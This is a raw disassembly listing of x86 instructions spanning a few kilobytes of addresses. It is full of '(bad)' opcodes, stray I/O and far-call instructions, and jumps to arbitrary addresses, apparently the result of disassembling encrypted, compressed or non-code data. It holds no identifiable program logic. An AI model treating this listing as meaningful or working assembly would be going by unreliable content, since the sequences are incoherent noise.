  41ba30:	cmp    al,0xb0
  41ba32:	pop    ebp
  41ba33:	mov    cl,BYTE PTR [esi]
  41ba35:	ins    BYTE PTR es:[edi],dx
  41ba36:	xchg   esi,eax
  41ba37:	rcl    ebp,cl
  41ba39:	xlat   BYTE PTR ds:[ebx]
  41ba3a:	cmp    al,0xec
  41ba3c:	(bad)  
  41ba3d:	xchg   esp,eax
  41ba3e:	xchg   edx,eax
  41ba3f:	push   edi
  41ba40:	jo     0x41bab7
  41ba42:	pop    ss
  41ba43:	mov    ds:0x51b767e9,eax
  41ba48:	fldcw  WORD PTR ds:[ebp+0x7f]
  41ba4c:	xchg   edx,eax
  41ba4d:	(bad)  
  41ba4e:	cmp    DWORD PTR [esi-0x6241890e],ebp
  41ba54:	xchg   ebp,eax
  41ba55:	nop
  41ba56:	cld    
  41ba57:	test   eax,0x660e0620
  41ba5c:	lock cli 
  41ba5e:	xchg   ecx,eax
  41ba5f:	push   esi
  41ba60:	outs   dx,BYTE PTR ds:[esi]
  41ba61:	cmc    
  41ba62:	pop    ebx
  41ba63:	fstp   DWORD PTR [eiz*8-0x18c6ed7b]
  41ba6a:	int3   
  41ba6b:	jecxz  0x41b9f5
  41ba6d:	inc    esi
  41ba6e:	mov    ch,0x93
  41ba70:	in     eax,dx
  41ba71:	mov    ds,WORD PTR [ebx+0x6e]
  41ba74:	jnp    0x41ba1d
  41ba76:	push   eax
  41ba77:	(bad)  
  41ba78:	loop   0x41ba6c
  41ba7a:	(bad)  
  41ba7b:	(bad)  
  41ba7c:	nop
  41ba7d:	pop    edx
  41ba7e:	pop    edi
  41ba7f:	add    BYTE PTR [esp+edi*2],ch
  41ba82:	test   bh,dl
  41ba84:	call   0xa456c165
  41ba89:	data16 jecxz 0x41bafa
  41ba8c:	ror    BYTE PTR [edx+0x6ec4e8a],cl
  41ba92:	cli    
  41ba93:	xor    esi,esp
  41ba95:	jo     0x41babf
  41ba97:	lahf   
  41ba98:	xchg   ebp,eax
  41ba99:	jle    0x41baab
  41ba9b:	xlat   BYTE PTR ds:[ebx]
  41ba9c:	cmp    al,0x2a
  41ba9e:	mov    bh,0x57
  41baa0:	xor    BYTE PTR [edi+eax*4-0x46],al
  41baa4:	adc    ch,BYTE PTR [ebx]
  41baa6:	cmp    al,0x1a
  41baa8:	je     0x41bae9
  41baaa:	sti    
  41baab:	inc    ebp
  41baac:	dec    ecx
  41baad:	inc    edi
  41baae:	xchg   esp,eax
  41baaf:	stos   DWORD PTR es:[edi],eax
  41bab0:	clc    
  41bab1:	jle    0x41ba53
  41bab3:	dec    edx
  41bab4:	jno    0x41baf0
  41bab6:	test   DWORD PTR [edi+eiz*8],eax
  41bab9:	call   0x7f91ca22
  41babe:	add    edx,DWORD PTR [esi-0x3c]
  41bac1:	ss ds push edi
  41bac4:	(bad)  
  41bac6:	jo     0x41ba61
  41bac8:	aam    0xa6
  41baca:	or     DWORD PTR [esp+esi*1+0x5a],ebx
  41bace:	mov    esp,edi
  41bad0:	(bad)  
  41bad1:	sbb    al,0xdc
  41bad3:	mov    ecx,0x5ce52e03
  41bad8:	inc    edx
  41bad9:	lods   eax,DWORD PTR ds:[esi]
  41bada:	pop    esp
  41badb:	xchg   esi,eax
  41badc:	mov    BYTE PTR [ecx+edx*4+0x14739ccf],dh
  41bae3:	shr    DWORD PTR [esi+0x2f3c0f96],0x2e
  41baea:	mov    bl,0x4e
  41baec:	pop    ebx
  41baed:	add    dl,BYTE PTR [edx+ebp*1+0x2c]
  41baf1:	data16 jae 0x41baf2
  41baf4:	addr16 aas 
  41baf6:	inc    ebx
  41baf7:	sub    BYTE PTR [edi+0x6c92f9c9],dh
  41bafd:	adc    DWORD PTR [ebx-0x34],ecx
  41bb00:	std    
  41bb01:	call   0xb7e1dffa
  41bb06:	cmp    eax,DWORD PTR [esi+edx*4]
  41bb09:	hlt    
  41bb0a:	ror    BYTE PTR [ecx],0x6b
  41bb0d:	popf   
  41bb0e:	les    ebp,FWORD PTR [ebp+0x1b]
  41bb11:	jecxz  0x41bac2
  41bb13:	cmp    DWORD PTR [ecx],ebp
  41bb15:	mov    eax,ds:0xb35c1cf6
  41bb1a:	pop    esi
  41bb1b:	lds    ebx,FWORD PTR [edi-0x15f9b9dc]
  41bb21:	scas   eax,DWORD PTR es:[edi]
  41bb22:	addr16 repnz test esp,0x66e0814
  41bb2a:	mov    BYTE PTR [ecx+0x7282b58d],ah
  41bb30:	lods   al,BYTE PTR fs:[esi]
  41bb32:	or     BYTE PTR [ebx-0x13640658],ch
  41bb38:	sub    edx,DWORD PTR [ecx-0x2c]
  41bb3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb3c:	sbb    eax,DWORD PTR [ebx+0x251879e5]
  41bb42:	mov    ds:0x1decbd92,al
  41bb47:	adc    edx,edx
  41bb49:	xchg   edx,eax
  41bb4a:	sti    
  41bb4b:	or     al,0x1d
  41bb4d:	out    dx,al
  41bb4e:	dec    esp
  41bb4f:	mov    dl,0xca
  41bb51:	or     al,0x94
  41bb53:	lods   al,BYTE PTR ds:[esi]
  41bb54:	adc    DWORD PTR [ebp+edx*8-0x7a],ebx
  41bb58:	xor    BYTE PTR [ebx+0x6b],ch
  41bb5b:	add    DWORD PTR [ebx],edi
  41bb5d:	sar    dh,0x80
  41bb60:	push   esp
  41bb61:	pop    ecx
  41bb62:	mov    WORD PTR [ebx+0xa],gs
  41bb65:	inc    eax
  41bb66:	or     bl,0x43
  41bb69:	jae    0x41bb0c
  41bb6b:	xor    BYTE PTR [ebp+0x5f],al
  41bb6e:	push   es
  41bb6f:	xor    eax,0xc9252e7a
  41bb74:	sub    eax,0xa98bd659
  41bb79:	mov    al,BYTE PTR [edx]
  41bb7b:	xor    eax,ebx
  41bb7d:	jge    0x41bb27
  41bb7f:	pop    esp
  41bb80:	mov    ah,0x8e
  41bb82:	fistp  DWORD PTR [ecx+0x7b]
  41bb85:	sbb    dl,BYTE PTR [ecx+0x53]
  41bb88:	leave  
  41bb89:	or     ecx,DWORD PTR [esi+0x73]
  41bb8c:	repnz popf 
  41bb8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb8f:	iret   
  41bb90:	arpl   di,cx
  41bb92:	loopne 0x41bb7a
  41bb94:	(bad)  [ebx-0x63]
  41bb97:	loope  0x41bb36
  41bb99:	mov    bl,0xc6
  41bb9b:	into   
  41bb9c:	rcr    DWORD PTR ds:0x68b330d3,1
  41bba2:	stos   BYTE PTR es:[edi],al
  41bba3:	add    DWORD PTR [esi-0x37dc0d5e],ecx
  41bba9:	xchg   esp,eax
  41bbaa:	add    DWORD PTR [edi],esp
  41bbac:	fxam   
  41bbae:	xlat   BYTE PTR ds:[ebx]
  41bbaf:	jb     0x41bbc5
  41bbb1:	inc    esp
  41bbb2:	cmp    DWORD PTR [ebx],esp
  41bbb4:	xchg   ebx,eax
  41bbb5:	fcom   st(4)
  41bbb7:	jg     0x41bbae
  41bbb9:	jp     0x41bb6c
  41bbbb:	(bad)  
  41bbbc:	mov    ebx,0xd32c3fc5
  41bbc1:	add    al,0x33
  41bbc3:	xchg   ebp,eax
  41bbc4:	or     DWORD PTR [ebp+0x109b5f78],ebx
  41bbca:	lods   eax,DWORD PTR ds:[esi]
  41bbcb:	xchg   ecx,eax
  41bbcc:	out    dx,eax
  41bbcd:	dec    edi
  41bbce:	(bad)  
  41bbcf:	les    esi,FWORD PTR [ecx-0x1b]
  41bbd2:	(bad)
  41bbd5:	sub    al,0xff
  41bbd7:	mov    cs,WORD PTR [edi+0x3f99c2ac]
  41bbdd:	ss xchg ebp,eax
  41bbdf:	call   0x176adb4e
  41bbe4:	ret    
  41bbe5:	cs jno 0x41bc3e
  41bbe8:	lea    ebp,[edx+0x72]
  41bbeb:	mov    esp,0x4c5b4623
  41bbf0:	arpl   WORD PTR [ebx+0x29970ddd],si
  41bbf6:	outs   dx,DWORD PTR ds:[esi]
  41bbf7:	aam    0xb5
  41bbf9:	lock and DWORD PTR [edi-0x4233533c],eax
  41bc00:	(bad)  
  41bc01:	aaa    
  41bc02:	dec    edx
  41bc03:	mov    edi,DWORD PTR [edi]
  41bc05:	mov    ds:0x28af1dd9,eax
  41bc0a:	pop    edx
  41bc0b:	in     eax,0x1d
  41bc0d:	pop    ebx
  41bc0e:	dec    edx
  41bc0f:	mov    ebx,0xa3487a48
  41bc14:	ins    BYTE PTR es:[edi],dx
  41bc15:	loopne 0x41bbd2
  41bc17:	xor    edi,ebx
  41bc19:	retf   0xbd95
  41bc1c:	dec    esi
  41bc1d:	out    0xa3,eax
  41bc1f:	push   ecx
  41bc21:	rcl    BYTE PTR [edi+0x48],1
  41bc24:	inc    esp
  41bc25:	out    0x65,eax
  41bc27:	push   0xffffffb8
  41bc29:	jge    0x41bc90
  41bc2b:	or     DWORD PTR [edi-0x577d62ee],ebx
  41bc31:	mov    edx,0x661dbd5c
  41bc36:	imul   ebp,DWORD PTR [ecx],0x9ac4fee5
  41bc3c:	push   es
  41bc3d:	mov    DWORD PTR [eax+ebx*1+0x754b9561],edx
  41bc44:	pop    eax
  41bc45:	xor    dh,BYTE PTR [ebx+0x395ad77d]
  41bc4b:	xchg   esp,eax
  41bc4c:	stos   BYTE PTR es:[edi],al
  41bc4d:	push   cs
  41bc4e:	(bad)  
  41bc4f:	rcl    BYTE PTR [ebx],1
  41bc51:	jbe    0x41bbdd
  41bc53:	jl     0x41bc2d
  41bc55:	push   ecx
  41bc56:	fdivr  DWORD PTR [edx-0x227bbb0d]
  41bc5c:	neg    DWORD PTR [esi-0x74]
  41bc5f:	xchg   ecx,eax
  41bc60:	shl    ch,1
  41bc62:	test   BYTE PTR [ebx+0x89d8b88],bl
  41bc68:	ficom  WORD PTR [edi-0x77]
  41bc6b:	sti    
  41bc6c:	leave  
  41bc6d:	js     0x41bccf
  41bc6f:	jl     0x41bcb3
  41bc71:	mov    ebx,0x7232740d
  41bc76:	push   ebp
  41bc77:	test   dl,0x82
  41bc7a:	add    eax,0x291f1ec6
  41bc7f:	ret    
  41bc80:	xchg   edi,eax
  41bc81:	cli    
  41bc82:	dec    ecx
  41bc83:	pop    esi
  41bc84:	sahf   
  41bc85:	mov    bl,0x16
  41bc87:	popa   
  41bc88:	cli    
  41bc89:	or     al,BYTE PTR [edi-0x2f7f54f0]
  41bc8f:	jb     0x41bcbf
  41bc91:	mov    esp,0x91b83bec
  41bc96:	push   ss
  41bc97:	xor    eax,0x38fa2fb6
  41bc9c:	sti    
  41bc9d:	jno    0x41bd0a
  41bc9f:	push   edi
  41bca0:	dec    eax
  41bca1:	push   es
  41bca2:	fs dec esi
  41bca4:	enter  0xc77d,0xdf
  41bca8:	or     dl,BYTE PTR [edi]
  41bcaa:	xchg   ebp,eax
  41bcab:	hlt    
  41bcac:	sub    eax,0x70e54d28
  41bcb1:	lahf   
  41bcb2:	daa    
  41bcb3:	popa   
  41bcb4:	outs   dx,BYTE PTR ds:[esi]
  41bcb5:	push   es
  41bcb6:	xchg   esp,eax
  41bcb7:	mov    ds:0x5c2be9dc,al
  41bcbc:	inc    edx
  41bcbd:	call   0x2d1f:0xe982d8a1
  41bcc4:	pop    edx
  41bcc5:	les    ecx,FWORD PTR [ebx-0x75]
  41bcc8:	cdq    
  41bcc9:	fisubr DWORD PTR [eax+0x26b80220]
  41bccf:	out    dx,al
  41bcd0:	sahf   
  41bcd1:	hlt    
  41bcd2:	imul   esi,DWORD PTR [ecx-0x6b],0x64b12b3f
  41bcd9:	adc    al,0x6f
  41bcdb:	pop    ds
  41bcdc:	add    BYTE PTR [ecx],0x8e
  41bcdf:	test   DWORD PTR [ecx],esp
  41bce1:	out    0x41,eax
  41bce3:	(bad)  
  41bce4:	dec    ebx
  41bce5:	add    esp,DWORD PTR [esi-0x5c]
  41bce8:	jae    0x41bd3a
  41bcea:	ins    BYTE PTR es:[edi],dx
  41bceb:	xor    eax,0xda277071
  41bcf0:	fs jge 0x41bd70
  41bcf3:	mov    bh,0x8
  41bcf5:	jae    0x41bcf7
  41bcf7:	xchg   BYTE PTR [ebp-0x73],bl
  41bcfa:	push   es
  41bcfb:	pop    ebp
  41bcfc:	loopne 0x41bcc2
  41bcfe:	(bad)  
  41bcff:	lock mov DWORD PTR [ecx-0x15],ebx
  41bd03:	mov    eax,ds:0x66518757
  41bd08:	in     eax,0xe2
  41bd0a:	lods   al,BYTE PTR ds:[esi]
  41bd0b:	xor    bh,BYTE PTR [esi]
  41bd0d:	(bad)  
  41bd0e:	int    0x8d
  41bd10:	or     eax,0x3371ac5d
  41bd15:	repz cs sbb al,0xd6
  41bd19:	pop    ecx
  41bd1a:	jl     0x41bd7a
  41bd1c:	fs cmp ebx,ecx
  41bd1f:	adc    cl,BYTE PTR gs:0xcf1effaf
  41bd26:	neg    DWORD PTR [esi+esi*1+0x3d]
  41bd2a:	dec    esi
  41bd2b:	ret    0xd859
  41bd2e:	in     al,0x1d
  41bd30:	sar    dl,cl
  41bd32:	sub    BYTE PTR [edx+0x11],bh
  41bd35:	into   
  41bd36:	lahf   
  41bd37:	pop    es
  41bd38:	xchg   esi,eax
  41bd39:	fstp   QWORD PTR [edx-0xc]
  41bd3c:	outs   dx,DWORD PTR ds:[esi]
  41bd3d:	sub    DWORD PTR [esi],esp
  41bd3f:	popf   
  41bd40:	retf   
  41bd41:	sbb    bl,ah
  41bd43:	cmp    bl,al
  41bd45:	pop    esp
  41bd46:	xor    BYTE PTR [edi],al
  41bd48:	jo     0x41bcec
  41bd4a:	jp     0x41bcf4
  41bd4c:	push   es
	...
  41bf19:	push   edi
  41bf1a:	lea    esp,[ecx+0x7e]
  41bf1d:	sti    
  41bf1e:	(bad)  
  41bf1f:	pop    edi
  41bf20:	lods   eax,DWORD PTR ds:[esi]
  41bf21:	into   
  41bf22:	fisttp DWORD PTR [edx+0x58]
  41bf25:	and    eax,DWORD PTR [ebx+0x2fbb5cbe]
  41bf2b:	add    DWORD PTR [eax],eax
  41bf2d:	and    BYTE PTR [edi],al
  41bf2f:	add    BYTE PTR [eax],al
  41bf31:	ror    BYTE PTR [eax],0x3b
  41bf34:	adc    BYTE PTR [ebx-0x488e7cb1],al
  41bf3a:	cmp    ebx,DWORD PTR [edi-0x11]
  41bf3d:	(bad)  
  41bf3e:	shr    BYTE PTR [ecx+edx*1+0x79],1
  41bf42:	cli    
  41bf43:	xor    al,0x47
  41bf45:	ret    
  41bf46:	cli    
  41bf47:	or     dl,0x6d
  41bf4a:	(bad)  
  41bf4b:	pop    ebx
  41bf4c:	xchg   ebx,eax
  41bf4d:	fwait
  41bf4e:	and    ecx,DWORD PTR ss:[ebp-0x2c134057]
  41bf55:	sub    ebp,DWORD PTR [ecx-0x64]
  41bf58:	adc    al,0x6e
  41bf5a:	mov    ds:0x14c3e4a1,al
  41bf5f:	adc    al,0xe5
  41bf61:	nop
  41bf62:	lahf   
  41bf63:	xor    BYTE PTR [edi-0x3d],ah
  41bf66:	loope  0x41bf6a
  41bf68:	pop    ss
  41bf69:	enter  0xec98,0xe5
  41bf6d:	mov    edx,0x49c1fb5b
  41bf72:	(bad)
  41bf76:	clc    
  41bf77:	jno    0x41bfda
  41bf79:	test   eax,0xc1f34546
  41bf7e:	out    0xd8,eax
  41bf80:	test   BYTE PTR [esi+0x567cbf26],ah
  41bf86:	ja     0x41bf98
  41bf88:	test   DWORD PTR [edx-0x62],esp
  41bf8b:	mov    ecx,0xebbd78b6
  41bf90:	ret    
  41bf91:	or     eax,ecx
  41bf93:	mov    eax,ds:0xe8fa79b4
  41bf98:	ret    0xdac3
  41bf9b:	dec    ecx
  41bf9c:	and    al,0xc9
  41bf9e:	cmp    al,0x9f
  41bfa0:	mov    edx,0x893f901b
  41bfa5:	push   0xc34d2ffd
  41bfaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfab:	or     DWORD PTR [esi+0x6ef420dd],esi
  41bfb1:	popa   
  41bfb2:	ds mov edi,0x68d9dcbe
  41bfb8:	retf   
  41bfb9:	jecxz  0x41bf70
  41bfbb:	cwde   
  41bfbc:	cli    
  41bfbd:	pusha  
  41bfbe:	inc    ebp
  41bfbf:	daa    
  41bfc0:	lock jo 0x41bfba
  41bfc3:	in     al,0x3f
  41bfc5:	(bad)  
  41bfc6:	mov    ebp,0x5db78c1e
  41bfcb:	and    edx,ebp
  41bfcd:	or     al,dl
  41bfcf:	xchg   edi,eax
  41bfd0:	xor    DWORD PTR [eax],edi
  41bfd2:	dec    eax
  41bfd3:	dec    esp
  41bfd4:	cmp    DWORD PTR [esi],0xa0bcca14
  41bfda:	xor    al,0xaf
  41bfdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfdd:	popw   ds
  41bfdf:	ds inc ecx
  41bfe1:	mov    ebx,0x4e04d828
  41bfe6:	add    BYTE PTR [edi-0x230cd100],ah
  41bfec:	push   0x7
  41bfee:	faddp  st(0),st
  41bff0:	lods   eax,DWORD PTR ds:[esi]
  41bff1:	sbb    DWORD PTR [edx],0x2a21236e
  41bff7:	pop    ss
  41bff8:	dec    edi
  41bff9:	pop    edx
  41bffa:	add    BYTE PTR [edx-0x6b],bh
  41bffd:	cmp    esi,esi
  41bfff:	gs mov ?,eax
  41c002:	pop    eax
  41c003:	cs leave 
  41c005:	or     DWORD PTR [eax+0x3642f5df],esp
  41c00b:	mov    dl,0x3a
  41c00d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c00e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c00f:	push   edi
  41c010:	push   edx
  41c011:	out    0x24,al
  41c013:	sahf   
  41c014:	pusha  
  41c015:	test   bh,dh
  41c017:	adc    bh,bh
  41c019:	sbb    DWORD PTR [edx+ecx*8],eax
  41c01c:	push   edi
  41c01d:	mov    al,ds:0x6c1a66bb
  41c022:	jbe    0x41c097
  41c024:	cmp    al,0xc6
  41c026:	out    dx,eax
  41c027:	push   edx
  41c028:	inc    esp
  41c029:	fnstenv [edi+0x10b666c5]
  41c02f:	ss jb  0x41c028
  41c032:	and    BYTE PTR [eax-0x2bc9c082],bh
  41c038:	dec    esp
  41c039:	add    BYTE PTR [ebp+0x452b025a],0x8b
  41c040:	pop    eax
  41c041:	mov    bl,0xc9
  41c043:	mov    al,0x9a
  41c045:	pop    ebx
  41c046:	dec    esi
  41c047:	push   esi
  41c048:	pop    esi
  41c049:	push   es
  41c04a:	add    al,0x55
  41c04c:	aad    0xa5
  41c04e:	ss dec edi
  41c050:	push   eax
  41c051:	dec    eax
  41c052:	ins    DWORD PTR es:[edi],dx
  41c053:	mov    DWORD PTR ds:0xf203cdab,0xba18e545
  41c05d:	cmp    BYTE PTR [esi],ch
  41c05f:	cmp    eax,0x44fffa0e
  41c064:	mov    ebx,0xa590b56f
  41c069:	popf   
  41c06a:	sub    ebp,esi
  41c06c:	dec    ecx
  41c06d:	pop    es
  41c06e:	mov    BYTE PTR [edx-0x5905226a],0x58
  41c075:	or     ebx,esp
  41c077:	push   edx
  41c078:	hlt    
  41c079:	aaa    
  41c07a:	adc    ah,BYTE PTR [edx-0x14]
  41c07d:	(bad)  
  41c07e:	cld    
  41c07f:	inc    ebp
  41c080:	dec    edx
  41c081:	mov    ebx,0x48694525
  41c086:	mov    al,0x41
  41c088:	in     eax,dx
  41c089:	mov    DWORD PTR [ecx+0x14a406e5],ecx
  41c08f:	test   BYTE PTR [eax+ebp*4+0x6d],dl
  41c093:	rol    BYTE PTR [eax],1
  41c095:	and    eax,DWORD PTR [ebx]
  41c097:	loopne 0x41c06e
  41c099:	push   ss
  41c09a:	and    al,0x7f
  41c09c:	and    al,0x2d
  41c09e:	aas    
  41c09f:	or     BYTE PTR [ebx],dl
  41c0a1:	adc    ah,dh
  41c0a3:	fisub  DWORD PTR [edi+0xc]
  41c0a6:	aaa    
  41c0a7:	dec    ecx
  41c0a8:	add    DWORD PTR [esi+0x60],ecx
  41c0ab:	repz pusha 
  41c0ad:	add    esp,DWORD PTR [ebp+eax*1-0xc]
  41c0b1:	jl     0x41c06a
  41c0b3:	in     eax,0x2f
  41c0b5:	test   BYTE PTR [ecx-0x43],0xfd
  41c0b9:	or     BYTE PTR [ebp+0x630088fe],ch
  41c0bf:	jo     0x41c068
  41c0c1:	and    DWORD PTR [edi-0x23a5645e],ebp
  41c0c7:	aad    0x19
  41c0c9:	xchg   DWORD PTR ds:0x7b8af72f,esi
  41c0cf:	or     dl,BYTE PTR [edi-0x19]
  41c0d2:	ror    DWORD PTR [ecx-0x2e018b8d],cl
  41c0d8:	ret    0x1bc2
  41c0db:	jne    0x41c0ef
  41c0dd:	push   edi
  41c0de:	ss lea ecx,ds:[esi+0x47]
  41c0e3:	hlt    
  41c0e4:	cs ret 
  41c0e6:	ret    
  41c0e7:	jo     0x41c0e5
  41c0e9:	leave  
  41c0ea:	sub    cl,ah
  41c0ec:	pop    DWORD PTR [ecx+eax*4-0x74fd5e55]
  41c0f3:	push   ecx
  41c0f4:	ja     0x41c164
  41c0f6:	cmp    bl,BYTE PTR ds:0x71c6ac1d
  41c0fc:	popa   
  41c0fd:	xchg   edx,eax
  41c0fe:	imul   edx,edx,0x1b
  41c101:	or     ecx,eax
  41c103:	sbb    dh,BYTE PTR [bx+di]
  41c106:	popa   
  41c107:	loop   0x41c178
  41c109:	mov    BYTE PTR [eax+0x6b],cl
  41c10c:	icebp  
  41c10d:	sbb    DWORD PTR [eax],esp
  41c10f:	jbe    0x41c16f
  41c111:	mov    dl,0x43
  41c113:	mov    ebp,0x31f570
  41c118:	call   0x58c7:0x27d576b5
  41c11f:	sbb    al,ah
  41c121:	xor    al,0x7d
  41c123:	out    0x7d,eax
  41c125:	and    BYTE PTR [ebx+ebx*8-0x5796431b],dh
  41c12c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c12d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c12e:	gs xchg esi,eax
  41c130:	push   ebp
  41c131:	inc    edx
  41c132:	jecxz  0x41c174
  41c134:	jb     0x41c0be
  41c136:	xchg   al,bl
  41c138:	push   eax
  41c139:	leave  
  41c13a:	inc    edx
  41c13b:	add    DWORD PTR [ebx],0x67
  41c13e:	xchg   DWORD PTR [ebp+edi*2+0x3d],esi
  41c142:	in     al,dx
  41c143:	push   eax
  41c144:	xchg   DWORD PTR [edi],ecx
  41c146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c147:	pop    ebp
  41c148:	clc    
  41c149:	dec    ebp
  41c14a:	paddusb mm0,QWORD PTR [esi+0x6bdd137b]
  41c151:	cmp    ecx,DWORD PTR [ebx]
  41c153:	outs   dx,BYTE PTR ds:[esi]
  41c154:	xchg   ecx,eax
  41c155:	inc    esp
  41c156:	les    eax,FWORD PTR [edi+0x75]
  41c159:	or     DWORD PTR [ecx-0x34],esp
  41c15c:	sub    ecx,eax
  41c15e:	push   eax
  41c15f:	xor    eax,DWORD PTR [ecx-0x43b7a235]
  41c165:	push   esp
  41c166:	and    ch,al
  41c168:	jae    0x41c1db
  41c16a:	jp     0x41c17a
  41c16c:	lahf   
  41c16d:	jnp    0x41c184
  41c16f:	push   ds
  41c170:	pop    ebx
  41c171:	or     eax,DWORD PTR [eax-0x710eda80]
  41c177:	fs jl  0x41c15d
  41c17a:	xchg   ebx,eax
  41c17b:	pop    edx
  41c17c:	imul   edi,ebx,0xffffffc5
  41c17f:	or     al,ch
  41c181:	sbb    bl,BYTE PTR [ebp-0x190aa660]
  41c187:	sub    al,0x31
  41c189:	loope  0x41c173
  41c18b:	ds fwait
  41c18d:	retf   0xdff3
  41c190:	cmp    esi,DWORD PTR [ebp-0x46]
  41c193:	daa    
  41c194:	and    dl,cl
  41c196:	mov    DWORD PTR [esi-0x933f3e5],ebx
  41c19c:	call   0x99fa1104
  41c1a1:	or     DWORD PTR [esi+0x21],edi
  41c1a4:	push   cs
  41c1a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1a6:	leave  
  41c1a7:	jge    0x41c16e
  41c1a9:	icebp  
  41c1aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1ab:	xor    esp,edi
  41c1ad:	or     DWORD PTR [ebx-0xc95aa95],ebp
  41c1b3:	xchg   DWORD PTR [edx],edi
  41c1b5:	(bad)  
  41c1b6:	int    0xb8
  41c1b8:	push   0x5a
  41c1ba:	sub    eax,0xb0044a0b
  41c1bf:	cmp    ebp,eax
  41c1c1:	jmp    0xa1d7ade7
  41c1c6:	ins    DWORD PTR es:[edi],dx
  41c1c7:	pop    edi
  41c1c8:	push   ecx
  41c1c9:	dec    esp
  41c1ca:	mov    ds:0xd923eaa9,al
  41c1cf:	fisttp WORD PTR [ebx-0x1e]
  41c1d2:	in     eax,0x63
  41c1d4:	cld    
  41c1d5:	aas    
  41c1d6:	xchg   ebx,eax
  41c1d7:	mov    ds:0x1d046dde,al
  41c1dc:	and    ch,BYTE PTR [esi-0xf350fc4]
  41c1e2:	mov    WORD PTR [edx+0x2b6443de],?
  41c1e8:	cmp    eax,0xa4ef69fa
  41c1ed:	sbb    al,0x2b
  41c1ef:	sbb    dl,BYTE PTR [ebx-0x3638de8d]
  41c1f5:	iret   
  41c1f6:	nop
  41c1f7:	mov    bh,0x32
  41c1f9:	xchg   edi,eax
  41c1fa:	mov    ds:0x997f08b8,al
  41c1ff:	sbb    BYTE PTR [edx-0x72],ch
  41c202:	push   0xffffff82
  41c204:	jns    0x41c1f0
  41c206:	test   BYTE PTR [eax+0xa1bad79],ch
  41c20c:	add    ecx,DWORD PTR [ecx-0x41]
  41c20f:	dec    edx
  41c210:	test   DWORD PTR [edx-0x56c585da],esi
  41c216:	sbb    al,0xf2
  41c218:	inc    ecx
  41c219:	es add eax,0x6a22f76b
  41c21f:	and    eax,0xf31bd3b9
  41c224:	jl     0x41c1bd
  41c226:	loopne 0x41c213
  41c228:	xchg   ecx,eax
  41c229:	xor    esi,ebx
  41c22b:	inc    ebp
  41c22c:	sub    ebx,DWORD PTR [ebx+esi*1+0x51a3d43f]
  41c233:	scas   al,BYTE PTR es:[edi]
  41c234:	arpl   WORD PTR [edx+0x22],bp
  41c237:	mov    esp,0x492d7ce9
  41c23c:	adc    eax,0x6d8d1097
  41c241:	push   es
  41c242:	mov    ds:0xb4729ca5,al
  41c247:	data16 jg 0x41c201
  41c24a:	idiv   DWORD PTR [edx]
  41c24c:	lods   al,BYTE PTR ds:[esi]
  41c24d:	dec    esp
  41c24e:	es or  esp,edi
  41c251:	inc    esp
  41c252:	mov    al,0x64
  41c254:	sti    
  41c255:	jns    0x41c2c5
  41c257:	sbb    BYTE PTR [edx-0x5d4dfe64],cl
  41c25d:	lahf   
  41c25e:	dec    esp
  41c25f:	stc    
  41c260:	or     esi,DWORD PTR [esi+0x36]
  41c263:	(bad)  
  41c264:	call   0x5218:0xa0fd7844
  41c26b:	sub    ebx,0x8ec2086b
  41c271:	inc    esi
  41c272:	xchg   ecx,eax
  41c273:	call   0x85c40faf
  41c278:	nop
  41c279:	push   edx
  41c27a:	push   ecx
  41c27b:	inc    edi
  41c27c:	hlt    
  41c27d:	pop    edi
  41c27e:	in     al,0xd1
  41c280:	bound  ebx,QWORD PTR [esi-0x2ae0afa0]
  41c286:	fadd   st,st(2)
  41c288:	sti    
  41c289:	adc    bh,bh
  41c28b:	pusha  
  41c28c:	inc    edx
  41c28d:	add    DWORD PTR [ebx-0x5076fa24],ecx
  41c293:	imul   BYTE PTR [edx+ebx*4-0x63]
  41c297:	pop    ebx
  41c298:	mov    ebp,0xcf2c2d3c
  41c29d:	aam    0x64
  41c29f:	clc    
  41c2a0:	mov    esp,0xb4575c66
  41c2a5:	(bad)  
  41c2a6:	lock mov WORD PTR ds:0xe1a959a2,gs
  41c2ad:	(bad)  
  41c2af:	out    0xaa,al
  41c2b1:	stc    
  41c2b2:	call   0xa34c:0xc0136fcc
  41c2b9:	ret    
  41c2ba:	cld    
  41c2bb:	js     0x41c274
  41c2bd:	jg     0x41c2a2
  41c2bf:	jg     0x41c27f
  41c2c1:	xor    al,0xd6
  41c2c3:	cmp    eax,DWORD PTR [edx+0x2a]
  41c2c6:	fcomp  QWORD PTR [ecx]
  41c2c8:	inc    ebp
  41c2c9:	mov    edi,0x5d80249a
  41c2ce:	jp     0x41c2c8
  41c2d0:	cwde   
  41c2d1:	inc    ebp
  41c2d2:	stos   BYTE PTR es:[edi],al
  41c2d3:	out    0xab,al
  41c2d5:	ret    
  41c2d6:	ret    0x7d0
  41c2d9:	test   eax,0x1e9eefc8
  41c2de:	into   
  41c2df:	aam    0xf0
  41c2e1:	jns    0x41c310
  41c2e3:	fcmovne st,st(1)
  41c2e5:	or     al,0xfe
  41c2e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2e8:	xor    eax,ebx
  41c2ea:	out    0x5,al
  41c2ec:	xchg   esp,eax
  41c2ed:	aad    0x37
  41c2ef:	pusha  
  41c2f0:	sub    al,0x51
  41c2f2:	repz cmp BYTE PTR [esi-0x1dfdef5d],dh
  41c2f9:	(bad)  
  41c2fa:	int3   
  41c2fb:	popa   
  41c2fc:	cs mov dl,0x51
  41c2ff:	and    ch,BYTE PTR [esi+0x7f]
  41c302:	fs xchg edx,eax
  41c304:	jbe    0x41c2c2
  41c306:	mov    ds:0x72f2ec29,eax
  41c30b:	dec    ebp
  41c30c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c30d:	call   edi
  41c30f:	scas   al,BYTE PTR es:[edi]
  41c310:	ret    
  41c311:	daa    
  41c312:	(bad)  
  41c313:	xor    dl,dl
  41c315:	sbb    ebp,DWORD PTR [ebp+0x45]
